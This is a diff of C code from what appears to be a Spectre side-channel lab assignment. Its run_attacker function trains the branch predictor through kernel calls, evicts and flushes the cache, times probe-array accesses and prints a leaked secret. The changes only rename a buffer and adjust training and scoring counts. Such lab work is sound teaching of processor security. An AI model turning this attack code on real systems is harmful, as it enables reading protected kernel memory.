@@ -45,8 +45,8 @@ int run_attacker(int kernel_fd, char *shared_memory) {
     char leaked_str[SHD_SPECTRE_LAB_SECRET_MAX_LEN];
     size_t current_offset = 0;
 
-    char *eviction_buf = malloc(EVICT_SIZE);
-    memset(eviction_buf, 1, EVICT_SIZE);
+    char *evict_buf = malloc(EVICT_SIZE);
+    memset(evict_buf, 1, EVICT_SIZE);
 
     printf("Launching attacker\n");
 
@@ -68,14 +68,14 @@ int run_attacker(int kernel_fd, char *shared_memory) {
             
 
             // 1. TRAIN branch predictor
-            for (int i = 0; i < 50; i++) {
+            for (int i = 0; i < 30; i++) {
                 call_kernel_part3(kernel_fd, shared_memory, 0);
             }
 
             //Add extra evict
             volatile int sink = 0;
             for (int e = 0; e < EVICT_SIZE; e += 64) {
-                sink += eviction_buf[e];
+                sink += evict_buf[e];
             }
 
             // 2. FLUSH probe array
@@ -93,7 +93,7 @@ int run_attacker(int kernel_fd, char *shared_memory) {
                 uint64_t time = time_access(shared_memory + i * SHD_SPECTRE_LAB_PAGE_SIZE);
 
                 if (time < CACHE_HIT_THRESHOLD) {
-                    scores[i]+= 2;
+                    scores[i]+= 1;
                 }
             }
         }
@@ -116,7 +116,7 @@ int run_attacker(int kernel_fd, char *shared_memory) {
         
     }
 
-    free(eviction_buf);
+    free(evict_buf);
 
     leaked_str[SHD_SPECTRE_LAB_SECRET_MAX_LEN - 1] = '\0';
     printf("\n\n[Part 3] We leaked:\n%s\n", leaked_str);
